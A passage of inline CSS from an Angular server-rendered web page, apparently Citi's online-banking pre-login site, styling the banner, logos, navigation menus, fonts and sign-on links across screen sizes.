    object[_ngcontent-ssr-c112],
    ol[_ngcontent-ssr-c112],
    output[_ngcontent-ssr-c112],
    p[_ngcontent-ssr-c112],
    pre[_ngcontent-ssr-c112],
    q[_ngcontent-ssr-c112],
    ruby[_ngcontent-ssr-c112],
    s[_ngcontent-ssr-c112],
    samp[_ngcontent-ssr-c112],
    section[_ngcontent-ssr-c112],
    small[_ngcontent-ssr-c112],
    span[_ngcontent-ssr-c112],
    strike[_ngcontent-ssr-c112],
    strong[_ngcontent-ssr-c112],
    sub[_ngcontent-ssr-c112],
    summary[_ngcontent-ssr-c112],
    sup[_ngcontent-ssr-c112],
    table[_ngcontent-ssr-c112],
    tbody[_ngcontent-ssr-c112],
    td[_ngcontent-ssr-c112],
    tfoot[_ngcontent-ssr-c112],
    th[_ngcontent-ssr-c112],
    thead[_ngcontent-ssr-c112],
    time[_ngcontent-ssr-c112],
    tr[_ngcontent-ssr-c112],
    tt[_ngcontent-ssr-c112],
    u[_ngcontent-ssr-c112],
    ul[_ngcontent-ssr-c112],
    var[_ngcontent-ssr-c112],
    video[_ngcontent-ssr-c112] {
      margin: 0;
      padding: 0;
      border: 0;
      font: inherit;
      vertical-align: baseline
    }

    article[_ngcontent-ssr-c112],
    aside[_ngcontent-ssr-c112],
    details[_ngcontent-ssr-c112],
    figcaption[_ngcontent-ssr-c112],
    figure[_ngcontent-ssr-c112],
    footer[_ngcontent-ssr-c112],
    header[_ngcontent-ssr-c112],
    hgroup[_ngcontent-ssr-c112],
    menu[_ngcontent-ssr-c112],
    nav[_ngcontent-ssr-c112],
    section[_ngcontent-ssr-c112] {
      display: block
    }

    body[_ngcontent-ssr-c112] {
      line-height: 1
    }

    ol[_ngcontent-ssr-c112],
    ul[_ngcontent-ssr-c112] {
      list-style: none
    }

    blockquote[_ngcontent-ssr-c112],
    q[_ngcontent-ssr-c112] {
      quotes: none
    }

    blockquote[_ngcontent-ssr-c112]:after,
    blockquote[_ngcontent-ssr-c112]:before,
    q[_ngcontent-ssr-c112]:after,
    q[_ngcontent-ssr-c112]:before {
      content: "";
      content: none
    }

    table[_ngcontent-ssr-c112] {
      border-collapse: collapse;
      border-spacing: 0
    }

    .journeyLogo[_ngcontent-ssr-c112] {
      display: flex
    }

    .divider[_ngcontent-ssr-c112] {
      border-left: 3.5px solid #d3d3d3;
      height: 28px;
      margin-top: 23px;
      margin-right: 10px
    }

    .webLogo[_ngcontent-ssr-c112] {
      max-width: 100%;
      max-height: 100%;
      display: block
    }

    .box[_ngcontent-ssr-c112] {
      width: 180px;
      display: flex;
      justify-content: left;
      align-items: center
    }

    .webDiv[_ngcontent-ssr-c112] {
      margin-left: 5px
    }

    .box.small[_ngcontent-ssr-c112] {
      height: 72px
    }

    .box.small[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
      height: 40px
    }

    @media screen and (min-width:1000px) {
      .divider[_ngcontent-ssr-c112] {
        margin-left: 35px;
        height: 37px;
        margin-top: 27px
      }

      .box.small[_ngcontent-ssr-c112] {
        height: 88px
      }

      .box.small[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
        height: 48px
      }

      .webDiv[_ngcontent-ssr-c112] {
        margin-left: 15px
      }
    }

    .banner[_ngcontent-ssr-c112] {
      height: 88px;
      background-color: #fff !important
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] {
      height: 100%;
      padding: 0 35px 0 20px;
      position: relative;
      display: flex;
      justify-content: space-between
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .cpc[_ngcontent-ssr-c112] {
      height: 88px;
      width: auto;
      padding-bottom: 20px;
      padding-left: 17px
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .cpc[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
      height: auto;
      width: auto
    }

    @media (max-width:990px) {
      .banner[_ngcontent-ssr-c112] {
        height: 72px
      }

      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] {
        padding: 0
      }

      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .cpc[_ngcontent-ssr-c112] {
        height: 72px;
        width: auto;
        padding: 0
      }

      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .cpc[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
        height: 72px;
        width: auto;
        padding-left: 16px
      }
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .cpb[_ngcontent-ssr-c112] {
      height: 88px;
      width: auto
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .cpb[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
      width: auto
    }

    @media (max-width:990px) {

      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .cpb[_ngcontent-ssr-c112],
      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .cpb[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
        height: 72px;
        width: auto
      }
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .business[_ngcontent-ssr-c112],
    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .gold[_ngcontent-ssr-c112],
    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .priority[_ngcontent-ssr-c112] {
      height: 88px;
      width: auto;
      padding-top: 28px;
      padding-bottom: 20px;
      padding-left: 14px
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .business[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112],
    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .gold[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112],
    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .priority[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
      height: 40px;
      width: auto
    }

    @media (max-width:990px) {

      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .business[_ngcontent-ssr-c112],
      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .gold[_ngcontent-ssr-c112],
      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .priority[_ngcontent-ssr-c112] {
        height: 72px;
        width: auto;
        padding: 0
      }

      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .business[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112],
      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .gold[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112],
      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .priority[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
        height: 72px;
        width: auto;
        padding-left: 16px
      }
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .att[_ngcontent-ssr-c112] {
      height: auto;
      width: auto;
      padding-top: 16px;
      padding-bottom: 16px;
      padding-left: 37px
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .att[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
      height: 56px;
      width: 188.6px
    }

    @media (max-width:990px) {
      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .att[_ngcontent-ssr-c112] {
        height: auto;
        width: auto;
        padding-top: 10px;
        padding-bottom: 10px;
        padding-left: 13px
      }

      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .att[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
        height: 52px;
        width: 170px
      }
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .default[_ngcontent-ssr-c112] {
      height: 88px;
      width: 88px;
      padding-left: 20px
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .default[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
      height: 88px;
      width: 88px
    }

    @media (max-width:990px) {
      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .default[_ngcontent-ssr-c112] {
        height: 72px;
        width: 72px;
        padding: 0
      }

      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .default[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
        height: 72px;
        width: 72px
      }
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] {
      display: flex
    }

    .banner .content-wrap .buttons [_nghost-ssr-c112] child-nav-group -shadowcsshost child-nav-group ul {
      background-color: #fff
    }

    .banner .content-wrap .buttons [_nghost-ssr-c112] child-nav-group .subMenuGroupTitle {
      font-family: Interstate-Regular, sans-serif;
      font-size: 12px;
      color: #666;
      letter-spacing: 0;
      line-height: 20px
    }

    .banner .content-wrap .buttons [_nghost-ssr-c112] child-nav-group .child-links {
      font-family: Interstate-Light;
      font-size: 16px;
      color: #333;
      letter-spacing: 0;
      line-height: 22px
    }

    @media screen and (max-width:1120px) {
      .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] {
        display: none
      }
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .navButton[_ngcontent-ssr-c112] {
      padding-top: 27px;
      padding-bottom: 15px;
      padding-right: 24px
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .navButton[_ngcontent-ssr-c112]:last-child {
      padding-right: 0
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .navButton[_ngcontent-ssr-c112] a[_ngcontent-ssr-c112],
    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .navButton[_ngcontent-ssr-c112] button[_ngcontent-ssr-c112] {
      cursor: pointer;
      background: 0 0;
      border: none
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .navButton[_ngcontent-ssr-c112] button[_ngcontent-ssr-c112] {
      padding-top: 0
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .navButton[_ngcontent-ssr-c112] img[_ngcontent-ssr-c112] {
      height: 26px;
      width: 26px;
      margin: auto;
      display: block
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .navButton[_ngcontent-ssr-c112] span[_ngcontent-ssr-c112] {
      display: block;
      padding-top: 8px;
      font-family: Interstate-Regular, sans-serif;
      font-size: 11px;
      color: #666;
      letter-spacing: 0;
      text-align: center
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .subMenuGroupParent[_ngcontent-ssr-c112] {
      width: 226px;
      border: 1px solid #eee;
      background: #fff;
      z-index: 1;
      display: none;
      position: absolute;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .125)
    }

    .banner[_ngcontent-ssr-c112] .content-wrap[_ngcontent-ssr-c112] .buttons[_ngcontent-ssr-c112] .subMenuGroupParent[_ngcontent-ssr-c112] .flexColumnContainer[_ngcontent-ssr-c112] {
      padding-left: 40px
    }
  </style>
  <style>
    @charset "UTF-8";

    [_nghost-ssr-c131] {
      overflow-x: hidden
    }

    a[_ngcontent-ssr-c131]:focus {
      outline: -webkit-focus-ring-color auto 5px !important;
      outline-offset: -2px
    }

    @font-face {
      font-family: Interstate_Light;
      src: url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Light.eot);
      src: url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Light.eot?#iefix) format("embedded-opentype"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Light.woff) format("woff"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Light.ttf) format("truetype"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Light.svg#fontname) format("svg");
      font-weight: 400;
      font-style: normal
    }

    @media screen and (min-width:1024px) and (max-width:1112px) {
      citi-modal[_ngcontent-ssr-c131] .modal {
        margin-top: 12% !important
      }
    }

    @media screen and (min-width:700px) and (max-width:1112px) {
      citi-modal[_ngcontent-ssr-c131] .modal {
        margin-top: 12% !important
      }

      .modal-dialog {
        width: 84% !important
      }
    }

    @font-face {
      font-family: Interstate_Regular;
      src: url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Regular.eot);
      src: url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Regular.eot?#iefix) format("embedded-opentype"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Regular.woff) format("woff"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Regular.ttf) format("truetype"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Regular.svg#fontname) format("svg");
      font-weight: 400;
      font-style: normal
    }

    @font-face {
      font-family: Interstate_Bold;
      src: url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Bold.eot);
      src: url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Bold.eot?#iefix) format("embedded-opentype"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Bold.woff) format("woff"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Bold.ttf) format("truetype"), url(/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Bold.svg#fontname) format("svg");
      font-weight: 400;
      font-style: normal
    }

    .citialliancedesk[_ngcontent-ssr-c131] {
      display: none !important
    }

    .navigationParent[_ngcontent-ssr-c131] {
      width: 100%;
      margin: 0 auto;
      height: 46px;
      position: relative
    }

    #signOnFocus[_ngcontent-ssr-c131] {
      color: #fff !important
    }

    .child-nav-group3[_ngcontent-ssr-c131],
    .som-redering[_ngcontent-ssr-c131] {
      width: 100%
    }

    @media screen and (max-width:991.9px) {

      .child-nav-group3[_ngcontent-ssr-c131],
      .som-redering[_ngcontent-ssr-c131] {
        display: block;
        width: 100%
      }
    }

    #openanaccountMainLI[_ngcontent-ssr-c131] #openanaccountsubGroup5[_ngcontent-ssr-c131] {
      display: none !important
    }

    .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] {
      display: flex;
      flex-direction: row;
      box-shadow: none;
      transition: .5s ease-in-out
    }

    .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerATMMainLI #butlerATMmainAnchor5 {
      display: none
    }

    @media screen and (max-width:1119.9px) {
      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerATMMainLI #butlerATMmainAnchor5 {
        display: block
      }
    }

    .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerEspanolMainLI #butlerEspanolmainAnchor6 {
      display: none
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] {
      max-width: 1341px;
      padding: 0 0 0 20px;
      margin: 0 99px 0 0
    }

    @media screen and (max-width:1120px) {
      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #navcreditCardMainLI .subMenuMainContainer .flexColumnContainer .subNavtitleMain {
        padding-bottom: 0 !important;
        margin-bottom: 0 !important
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #navcreditCardMainLI .subMenuMainContainer .flexColumnContainer .child-nav-group3 .quickLinks {
        margin-top: 0
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #navbankingMainLI .subMenuMainContainer .flexColumnContainer .subNavtitleMain {
        padding-bottom: 0 !important;
        margin-bottom: 0 !important
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #navlendingMainLI .subMenuMainContainer .flexColumnContainer .subNavtitleMain {
        padding-bottom: 0 !important;
        margin-bottom: 0 !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] {
        flex-direction: column;
        overflow: hidden;
        background: #fff
      }
    }

    .main-list-items[_ngcontent-ssr-c131] {
      list-style-type: none;
      margin: 0;
      float: left;
      cursor: pointer;
      display: inline-block
    }

    .mainListItems[_ngcontent-ssr-c131] {
      list-style: none
    }

    .main-links[_ngcontent-ssr-c131]:focus-visible {
      color: #fff !important
    }

    .signOnMobileLink[_ngcontent-ssr-c131]:focus-visible {
      color: #fff !important
    }

    @media only screen and (max-width:1050px) {
      .main-links[_ngcontent-ssr-c131]:focus-visible {
        color: #000 !important
      }
    }

    .main-links[_ngcontent-ssr-c131] {
      display: block;
      padding: 9px 20px 0;
      color: #fff;
      font-size: 16px;
      line-height: 30px;
      font-family: Interstate_Regular, sans-serif
    }

    @media screen and (min-width:1120px) {
      .langBtn[_ngcontent-ssr-c131] {
        display: none
      }
    }

    @media screen and (max-width:1119.9px) {
      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerEspanolMainLI #butlerEspanolmainAnchor6 {
        display: block
      }

      .langBtn[_ngcontent-ssr-c131] {
        border: 0;
        padding-top: 7px;
        background: 0 0;
        color: #056dae;
        font-family: Interstate_Regular, sans-serif
      }
    }

    .langBtn[_ngcontent-ssr-c131] img[_ngcontent-ssr-c131] {
      padding-left: 11px;
      filter: invert(.5) sepia(1) saturate(70) hue-rotate(178deg)
    }

    .langBtn[_ngcontent-ssr-c131] span[_ngcontent-ssr-c131] {
      padding-left: 15px
    }

    .main-links[_ngcontent-ssr-c131]:hover,
    .main-list-items[_ngcontent-ssr-c131]:hover {
      color: #fff;
      background: #056dae;
      line-height: 30px;
      height: 46px
    }

    .addBlueBorderBottom[_ngcontent-ssr-c131] .main-links[_ngcontent-ssr-c131],
    .main-list-items[_ngcontent-ssr-c131]:hover .main-links[_ngcontent-ssr-c131] {
      background: #056dae;
      height: 46px
    }

    .productsDesktopIcon[_ngcontent-ssr-c131] a[_ngcontent-ssr-c131],
    .profileDesktopIcon[_ngcontent-ssr-c131] a[_ngcontent-ssr-c131] {
      font-size: 12px;
      line-height: 17px;
      padding-top: 38px
    }

    .productsDesktopIcon[_ngcontent-ssr-c131]::before {
      content: "";
      background-repeat: no-repeat;
      background-size: 25px 25px;
      width: 25px;
      height: 25px;
      display: inline-block;
      position: absolute;
      bottom: 25px;
      left: 32px;
      pointer-events: none
    }

    .profileDesktopIcon[_ngcontent-ssr-c131]::before {
      content: "";
      background-repeat: no-repeat;
      background-size: 25px 25px;
      width: 25px;
      height: 25px;
      display: inline-block;
      position: absolute;
      bottom: 25px;
      left: 25px;
      pointer-events: none
    }

    @media screen and (max-width:1120px) {
      .navigationParent[_ngcontent-ssr-c131] {
        height: 50px;
        padding: 0
      }

      #accountssubGroup0[_ngcontent-ssr-c131] .child-nav-group3[_ngcontent-ssr-c131] li::after {
        border-bottom: none;
        margin: 0 !important
      }

      .nav-bar-main-ul[_ngcontent-ssr-c131] {
        width: 100%
      }

      .nav-bar-main-ul[_ngcontent-ssr-c131] .main-list-items[_ngcontent-ssr-c131] {
        width: 100%;
        border-top: 1px solid #eee;
        padding-bottom: 0;
        -webkit-tap-highlight-color: transparent
      }

      .nav-bar-main-ul[_ngcontent-ssr-c131] .main-links[_ngcontent-ssr-c131] {
        width: 100%;
        padding: 0 50px;
        color: #000;
        line-height: 40px;
        position: relative;
        top: 9%;
        background: 0 0 !important
      }

      .nav-bar-main-ul[_ngcontent-ssr-c131] .main-list-items[_ngcontent-ssr-c131] {
        display: inline-block;
        list-style-type: none;
        background: #fff;
        line-height: 60px;
        position: relative;
        margin: 0;
        cursor: pointer;
        float: none;
        height: 56px
      }

      .nav-bar-main-ul[_ngcontent-ssr-c131] .main-links[_ngcontent-ssr-c131]:hover,
      .nav-bar-main-ul[_ngcontent-ssr-c131] .main-list-items[_ngcontent-ssr-c131]:hover .main-links[_ngcontent-ssr-c131] {
        border-bottom: none;
        padding-bottom: 0;
        background-color: #fff !important;
        height: auto
      }

      .nav-bar-main-ul[_ngcontent-ssr-c131] .addBlueBorderBottom[_ngcontent-ssr-c131] .main-links[_ngcontent-ssr-c131] {
        border-bottom: none;
        padding-bottom: 0;
        height: auto
      }

      #profilesMainLI[_ngcontent-ssr-c131] a[_ngcontent-ssr-c131]::before {
        content: "";
        width: 35px;
        transform: scale(.7);
        background-repeat: no-repeat;
        height: 35px;
        display: inline-block;
        position: absolute;
        top: 3px;
        left: 10px
      }

      .searchForMobile[_ngcontent-ssr-c131] {
        display: block
      }
    }

    .searchForMobile[_ngcontent-ssr-c131] {
      display: none
    }

    @media (hover:none) {

      .main-list-items[_ngcontent-ssr-c131]:focus .subMenuGroupParent[_ngcontent-ssr-c131],
      .main-list-items[_ngcontent-ssr-c131]:hover .subMenuGroupParent[_ngcontent-ssr-c131] {
        display: none
      }

      .main-list-items[_ngcontent-ssr-c131]:hover {
        color: #000;
        border-bottom: none;
        padding-bottom: 0
      }

      .main-links[_ngcontent-ssr-c131]:hover {
        color: #000
      }

      .addBlueBorderBottom[_ngcontent-ssr-c131] .main-links[_ngcontent-ssr-c131],
      .main-list-items[_ngcontent-ssr-c131]:hover .main-links[_ngcontent-ssr-c131] {
        border-bottom: none;
        padding-bottom: 0
      }
    }

    .signOnDesktop[_ngcontent-ssr-c131] {
      font-family: Interstate_Regular, sans-serif;
      color: #fff
    }

    .signOffDesktop[_ngcontent-ssr-c131] {
      position: absolute;
      top: 0;
      right: 35px;
      border-bottom: none !important
    }

    @media screen and (max-width:1300px) and (min-width:1120px) {
      .signOffDesktop[_ngcontent-ssr-c131] {
        right: 13px
      }
    }

    @media screen and (max-width:1119.9px) {
      .signOffDesktop[_ngcontent-ssr-c131] {
        right: 13px !important
      }

      [_nghost-ssr-c131] #navOpenAccMainLI a:after {
        display: none
      }
    }

    .subMenuGroupLIPE1[_ngcontent-ssr-c131] {
      width: 25%
    }

    .subMenuMainContainer[_ngcontent-ssr-c131] {
      display: block;
      position: relative
    }

    .subMenuGroupParent[_ngcontent-ssr-c131] {
      background: #fff;
      z-index: 1;
      position: absolute;
      width: auto;
      left: 0;
      box-shadow: 0 2px 7px 2px rgba(0, 0, 0, .125)
    }

    @media screen and (max-width:1120px) {
      .subMenuGroupParent[_ngcontent-ssr-c131] {
        position: static;
        box-shadow: none;
        padding-left: 0
      }

      .minusIcon[_ngcontent-ssr-c131] {
        background: #eee
      }

      .plusIcon[_ngcontent-ssr-c131]::after {
        content: "";
        background-image: url(assets/img/chevronRight.png);
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 10px;
        right: 15px;
        width: 20px;
        height: 20px
      }

      .minusIcon[_ngcontent-ssr-c131]::after {
        content: "−";
        font-size: 18px;
        position: absolute;
        top: 0;
        right: 15px
      }
    }

    .flexContainer[_ngcontent-ssr-c131] {
      display: flex !important;
      flex-direction: row
    }

    .flexColumnContainer[_ngcontent-ssr-c131] {
      display: block;
      position: relative;
      margin-top: 53px
    }

    .spaceBetween[_ngcontent-ssr-c131] {
      justify-content: space-between
    }

    .floatRight[_ngcontent-ssr-c131] {
      float: right;
      position: absolute;
      right: 40px
    }

    @media screen and (max-width:1300px) and (min-width:1120px) {
      .floatRight[_ngcontent-ssr-c131] {
        right: 13px !important
      }
    }

    .displayNone[_ngcontent-ssr-c131] {
      display: none
    }

    .productExplorerListItem[_ngcontent-ssr-c131] {
      margin-left: 295px
    }

    @media screen and (max-width:1366px) {
      .productExplorerListItem[_ngcontent-ssr-c131] {
        margin-left: 220px
      }
    }

    @media screen and (max-width:1024px) {
      .productExplorerListItem[_ngcontent-ssr-c131] {
        margin-left: inherit
      }
    }

    @media screen and (max-width:991.9px) {
      .flexColumnContainer[_ngcontent-ssr-c131] {
        background: #fff !important;
        margin-top: 0
      }

      .productExplorerListItem[_ngcontent-ssr-c131] {
        margin-left: inherit
      }

      #productExplorerMainLI[_ngcontent-ssr-c131],
      #signOffMainLI[_ngcontent-ssr-c131] {
        display: none
      }
    }

    .productExplorerParent[_ngcontent-ssr-c131] {
      min-width: 500px;
      padding: 0 30px;
      cursor: auto
    }

    .productExplorerTitle[_ngcontent-ssr-c131] {
      font-size: 28px;
      font-family: Interstate_Bold;
      padding: 15px 10px 10px;
      color: #000;
      cursor: auto
    }

    .productExplorerText[_ngcontent-ssr-c131] {
      font-size: 16px;
      line-height: 26px;
      color: #666;
      padding: 0 10px;
      cursor: auto
    }

    #menuOpen[_ngcontent-ssr-c131] {
      pointer-events: none;
      width: 26px;
      height: 26px;
      position: absolute;
      background-repeat: no-repeat;
      left: 16px;
      top: 10px;
      background-image: urlassets/img/menu-close.svg);
      border-bottom: none !important
    }

    #menuClosed[_ngcontent-ssr-c131] {
      pointer-events: none;
      width: 26px;
      height: 26px;
      position: absolute;
      background-repeat: no-repeat;
      left: 16px;
      top: 10px;
      background-image: url(assets/img/menu-open.svg)
    }

    .bgBlue[_ngcontent-ssr-c131] {
      background: #056dae
    }

    .mobileMenuContainer[_ngcontent-ssr-c131] {
      display: none
    }

    .menuLinkMobile[_ngcontent-ssr-c131] {
      display: inline-block;
      cursor: pointer;
      padding: 0 0 0 10px;
      width: 58px;
      height: 100%;
      margin: 0;
      position: absolute;
      top: 0
    }

    .menuIconMobile[_ngcontent-ssr-c131] {
      font-size: 10px;
      height: 8px;
      transition: transform .4s ease-in-out
    }

    .rotate-180[_ngcontent-ssr-c131] {
      transition: 180ms linear;
      transform: rotateZ(180deg)
    }

    .signOffMobileLink[_ngcontent-ssr-c131],
    .signOnMobileLink[_ngcontent-ssr-c131] {
      font-family: Interstate_Regular, sans-serif;
      font-size: 16px;
      margin-right: 30px;
      cursor: pointer;
      position: absolute;
      top: 0;
      padding-top: 12px;
      padding-left: 19px;
      padding-right: 16px;
      right: -7px;
      color: #fff;
      font-weight: 100;
      height: 100%;
      overflow: hidden;
      display: block
    }

    @media screen and (max-width:1600px) and (min-width:1121px) {
      #signOnMobileALink[_ngcontent-ssr-c131] {
        display: none
      }
    }

    @media screen and (max-width:1120px) and (min-width:993px) {
      #signOnMobileALink[_ngcontent-ssr-c131] {
        display: block
      }
    }

    .signOffMobileLink[_ngcontent-ssr-c131]:hover,
    .signOnMobileLink[_ngcontent-ssr-c131]:hover {
      color: #fff;
      font-weight: 100;
      height: 100%;
      overflow: hidden;
      display: block
    }

    .signOnMobileLink[_ngcontent-ssr-c131]:hover {
      background: #056dae;
      position: absolute;
      top: 0;
      padding-top: 12px;
      padding-left: 19px;
      padding-right: 16px;
      right: -7px
    }

    @media screen and (max-width:1120px) {
      .mobileMenuContainer[_ngcontent-ssr-c131] {
        display: flex;
        flex-direction: row;
        justify-content: space-between;
        height: 50px;
        padding: 16px 0
      }

      .mobileMenuContainer[_ngcontent-ssr-c131] #mobileMenuLink[_ngcontent-ssr-c131] {
        border-bottom: none
      }

      #searchLi[_ngcontent-ssr-c131] {
        display: none
      }
    }

    @media screen and (max-width:280px) {
      .signOnMobileLink[_ngcontent-ssr-c131] {
        margin-right: 1px;
        padding-left: 1px;
        font-size: 15px
      }

      .menuLinkMobile[_ngcontent-ssr-c131] {
        padding: 0;
        width: 46px
      }

      #menuClosed[_ngcontent-ssr-c131] {
        left: 10px;
        width: 24px;
        height: 24px
      }
    }

    [_nghost-ssr-c131] .settingsIcon {
      background-image: url(assets/img/Settings_2X.png);
      width: 15px;
      height: 15px;
      display: inline-block;
      background-size: 15px 15px;
      vertical-align: middle;
      margin-right: 10px
    }

    [_nghost-ssr-c131] .creditCardsIcon {
      width: 22px;
      height: 22px;
      display: inline-block;
      background-size: 22px 22px;
      vertical-align: middle;
      margin-right: 10px;
      margin-left: -10px
    }

    [_nghost-ssr-c131] .lendingIcon {
      width: 22px;
      height: 22px;
      display: inline-block;
      background-size: 22px 22px;
      vertical-align: middle;
      margin-right: 10px;
      margin-left: -10px
    }

    [_nghost-ssr-c131] .citigoldIcon {
      width: 22px;
      height: 22px;
      display: inline-block;
      background-size: 22px 22px;
      vertical-align: middle;
      margin-right: 10px;
      margin-left: -10px
    }

    [_nghost-ssr-c131] .bankingIcon {
      width: 22px;
      height: 22px;
      display: inline-block;
      background-size: 22px 22px;
      vertical-align: middle;
      margin-right: 10px;
      margin-left: -10px
    }

    [_nghost-ssr-c131] .investingIcon {
      width: 22px;
      height: 22px;
      display: inline-block;
      background-size: 22px 22px;
      vertical-align: middle;
      margin-right: 10px;
      margin-left: -10px
    }

    [_nghost-ssr-c131] .moneyMovementIcon {
      width: 22px;
      height: 22px;
      display: inline-block;
      background-size: 22px 22px;
      vertical-align: middle;
      margin-right: 10px;
      margin-left: -10px
    }

    [_nghost-ssr-c131] #navOpenAccMainLI {
      position: relative;
      width: 188px;
      flex: 0
    }

    @media screen and (max-width:991.9px) {
      [_nghost-ssr-c131] #navOpenAccMainLI {
        width: 100%;
        text-align: center;
        height: 80px
      }

      [_nghost-ssr-c131] #navOpenAccMainLI a {
        position: absolute;
        top: 25%;
        color: #056dae
      }

      [_nghost-ssr-c131] #navOpenAccMainLI a:after {
        display: none
      }

      #searchLi[_ngcontent-ssr-c131] {
        display: none
